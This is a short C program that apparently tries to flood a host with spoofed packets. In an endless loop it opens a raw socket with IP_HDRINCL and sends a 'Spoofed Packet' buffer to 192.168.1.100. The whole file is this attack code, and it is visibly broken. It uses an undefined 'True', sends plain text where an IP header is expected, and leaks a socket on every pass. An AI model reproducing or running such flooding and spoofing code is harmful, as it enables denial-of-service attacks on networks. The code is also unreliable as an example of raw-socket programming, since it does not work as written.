#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

int main() {
    while(True){
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    struct sockaddr_in d = { .sin_family = AF_INET, .sin_addr.s_addr = inet_addr("192.168.1.100") };
    char p[20] = "Spoofed Packet";
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, (int[]){1}, sizeof(int));
    sendto(s, p, sizeof(p), 0, (struct sockaddr *)&d, sizeof(d));
    }
}

